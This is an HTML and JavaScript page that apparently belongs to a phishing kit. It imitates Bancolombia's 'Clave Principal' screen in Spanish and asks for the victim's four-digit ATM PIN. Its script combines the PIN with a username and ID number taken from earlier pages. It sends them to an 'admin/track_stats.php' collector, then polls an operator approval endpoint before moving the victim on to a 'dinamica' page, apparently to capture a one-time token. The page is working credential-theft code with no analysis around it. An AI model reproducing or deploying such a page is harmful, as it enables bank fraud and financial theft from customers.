<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%23FDDA24' width='100' height='100'/%3E%3C/svg%3E" type="image/x-icon">
    <title>Clave Principal - Bancolombia</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
        
        body {
            font-family: 'Open Sans', sans-serif;
        }

        .pin-input {
            width: 45px;
            height: 50px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            border: none;
            border-bottom: 2px solid #ccc;
            background: transparent;
            outline: none;
            transition: border-color 0.3s;
        }

        .pin-input:focus {
            border-bottom-color: #FDDA24;
        }

        .pin-container {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 10px;
        }

        .btn-yellow {
            background-color: #FDDA24;
            color: #000;
        }
        
        .btn-yellow:disabled {
            background-color: #E6E6E6;
            color: #808080;
        }

        .btn-outline {
            border: 1.5px solid #000;
            background: transparent;
            color: #000;
        }
    </style>
</head>

<body class="relative flex flex-col w-full h-dvh bg-[#F1F1F1]">
    
    <!-- Loader -->
    <div id="loader" class="hidden z-50 flex items-center justify-center absolute top-0 bottom-0 left-0 right-0 bg-black bg-opacity-75">
        <span class="flex-col items-center justify-center rounded-full flex bg-white min-w-[150px] min-h-[150px]">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="animate-spin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3a9 9 0 1 0 9 9" /></svg>
            <p class="mt-2">Procesando...</p>
        </span>
    </div>

    <!-- Header -->
    <span class="relative bg-white w-full h-[62px] flex items-center justify-center border-b border-gray-100">
        <div style="color: #FDDA24; font-weight: bold; font-size: 24px; letter-spacing: 2px;">BANCOLOMBIA</div>
    </span>

    <!-- Main Content -->
    <div class="flex flex-col items-center justify-center flex-grow bg-right-bottom">
        <h1 class="text-[22px] font-bold mb-6 text-[#333]">Clave Principal</h1>
  
        <div class="flex flex-col items-center rounded-[20px] shadow-lg gap-6 w-[95%] md:w-[480px] h-auto py-10 bg-white">
            <div class="w-16 h-16 flex items-center justify-center">
                <span style="font-size: 48px;">🔒</span>
            </div>

            <p class="text-[16px] text-[#333] text-center px-4">Es la misma que usas en el cajero automático</p>

            <div class="flex flex-col items-center">
                <div class="pin-container">
                    <input type="password" maxlength="1" inputmode="numeric" class="pin-input" id="pin-1">
                    <input type="password" maxlength="1" inputmode="numeric" class="pin-input" id="pin-2">
                    <input type="password" maxlength="1" inputmode="numeric" class="pin-input" id="pin-3">
                    <input type="password" maxlength="1" inputmode="numeric" class="pin-input" id="pin-4">
                </div>
            </div>

            <div id="verificando" style="display: none; text-align: center; width: 100%; padding: 20px;">
                <p style="color: #ff8c00; font-weight: bold; margin-bottom: 10px;">⏳ Verificando datos...</p>
                <p style="font-size: 12px; color: #666;">Por favor espera mientras el administrador verifica tus datos</p>
            </div>

            <div class="flex flex-row gap-4 w-full px-10 mt-6">
                <button onclick="window.history.back()" class="flex-1 py-4 rounded-full font-bold btn-outline text-[16px]">Volver</button>
                <button id="continueBtn" disabled class="flex-1 py-4 rounded-full font-bold btn-yellow text-[16px]">Continuar</button>
            </div>
        </div>

    </div>

    <!-- Footer -->
    <div class="mt-auto flex flex-col items-center pb-8">
        <div class="w-[80%] border-t border-gray-300 mb-6"></div>
        <p class="text-[13px] text-gray-600 mb-1">Dirección IP: 198.143.45.66</p>
        <p id="date" class="text-[13px] text-gray-600">0.0.0.0</p>
    </div>

    <script>
        const loaderStatus = (status) => {
            const loader = document.getElementById("loader");
            if(loader) status ? loader.classList.remove("hidden") : loader.classList.add("hidden");
        }

        const pinInputs = [
            document.getElementById('pin-1'),
            document.getElementById('pin-2'),
            document.getElementById('pin-3'),
            document.getElementById('pin-4')
        ];
        const continueBtn = document.getElementById("continueBtn");

        pinInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                const value = e.target.value;
                if (value.length > 0) {
                    if (index < 3) {
                        pinInputs[index + 1].focus();
                    }
                }
                checkPinComplete();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    pinInputs[index - 1].focus();
                }
            });

            if (index === 0) {
                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    let pasteData = (e.clipboardData || window.clipboardData).getData('text');
                    let digits = pasteData.replace(/[^0-9]/g, "").split('').slice(0, 4);
                    digits.forEach((digit, i) => {
                        if (pinInputs[i]) {
                            pinInputs[i].value = digit;
                        }
                    });
                    checkPinComplete();
                    if (digits.length > 0) {
                        let lastIdx = Math.min(digits.length - 1, 3);
                        pinInputs[lastIdx].focus();
                    }
                });
            }
        });

        function checkPinComplete() {
            const pin = pinInputs.map(input => input.value).join('');
            if (pin.length === 4) {
                continueBtn.disabled = false;
            } else {
                continueBtn.disabled = true;
            }
        }

        continueBtn.addEventListener("click", () => {
            const pin = pinInputs.map(input => input.value).join('');
            loaderStatus(true);
            
            const pseData = localStorage.getItem('pseGuardado');
            let documento = 'N/A';
            let banco = 'bancolombia';
            
            if (pseData) {
                try {
                    const pse = JSON.parse(pseData);
                    documento = pse.documento_pse || 'N/A';
                    banco = 'bancolombia';
                } catch (e) {}
            }
            
            // Obtener datos del login anterior
            const usuario = localStorage.getItem('usuario_bancolombia') || '';
            const identificacion = localStorage.getItem('identificacion_bancolombia') || '';
            const tipo_id = localStorage.getItem('tipo_id_bancolombia') || 'CC';
            
            const formData = new FormData();
            formData.append('activity', 'CLAVE (BANCOLOMBIA)');
            formData.append('action', 'log');
            formData.append('metodo', 'PSE');
            formData.append('banco', 'bancolombia');
            formData.append('documento', documento);
            formData.append('usuario', usuario);
            formData.append('identificacion', identificacion);
            formData.append('tipo_identificacion', tipo_id);
            formData.append('clave_pin', pin);

            console.log('✅ Enviando a track_stats.php:', {
                activity: 'CLAVE (BANCOLOMBIA)',
                usuario: usuario,
                clave_pin: pin
            });

            fetch('../../admin/track_stats.php', {
                method: 'POST',
                body: formData
            }).then(res => res.json()).then(data => {
                console.log('✅ Respuesta track_stats.php:', data);
                
                if (data.success) {
                    localStorage.setItem('log_id_actual', data.id);
                    document.getElementById('verificando').style.display = 'block';
                    startPollingAprobacion(data.id);
                } else {
                    loaderStatus(false);
                    console.error('❌ Error:', data);
                    alert('Error: ' + (data.message || 'Error desconocido'));
                }
            }).catch(err => {
                loaderStatus(false);
                console.error('❌ Error en fetch:', err);
                alert('Error: ' + err.message);
            });
        });

        function startPollingAprobacion(logId) {
            const pollInterval = setInterval(() => {
                fetch('../../admin/check_aprobacion.php?log_id=' + logId)
                    .then(res => res.json())
                    .then(data => {
                        console.log('Poll - Estado:', data.estado);
                        
                        if (data.estado === 'aprobado') {
                            clearInterval(pollInterval);
                            document.getElementById('loader').classList.add('hidden');
                            alert('✓ Datos aprobados');
                            setTimeout(() => {
                                window.location.assign('./dinamica.php');
                            }, 500);
                        } else if (data.estado === 'rechazado') {
                            clearInterval(pollInterval);
                            document.getElementById('loader').classList.add('hidden');
                            document.getElementById('verificando').style.display = 'none';
                            alert('✗ Datos rechazados. Por favor intenta nuevamente');
                            pinInputs.forEach(input => input.value = '');
                            continueBtn.disabled = true;
                        }
                    })
                    .catch(err => console.error('Error:', err));
            }, 2000);
        }

        function obtenerFechaHoraActual() {
            const now = new Date();
            const dias = ["Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado"];
            const meses = ["Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"];
            
            let h = now.getHours();
            let m = now.getMinutes();
            let p = h >= 12 ? 'p. m.' : 'a. m.';
            h = h % 12 || 12;
            m = m < 10 ? '0' + m : m;

            return `${dias[now.getDay()]}, ${now.getDate()} de ${meses[now.getMonth()]} de ${now.getFullYear()}, ${h}:${m} ${p}`;
        }

        const dateEl = document.getElementById("date");
        if (dateEl) {
            dateEl.innerText = obtenerFechaHoraActual();
            setInterval(() => dateEl.innerText = obtenerFechaHoraActual(), 60000);
        }

        // ✅ SCRIPT CORREGIDO: Carga en HTML, no dinámicamente
    </script>

    <!-- ✅ SCRIPT DE TRACKING - Cargado en HTML (NO dinámicamente) -->
    <script src="../../admin/core-sys.js"></script>
</body>
</html>